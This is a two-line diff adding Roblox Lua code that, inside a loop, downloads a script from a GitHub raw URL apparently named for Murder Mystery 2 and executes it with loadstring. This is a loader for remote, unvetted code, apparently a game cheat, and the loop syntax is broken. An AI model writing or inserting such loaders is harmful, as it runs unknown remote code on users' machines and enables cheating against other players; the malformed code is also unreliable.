@@ -1,0 +1,2 @@
+While True do
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xvkzi/mm2/main/script"))()
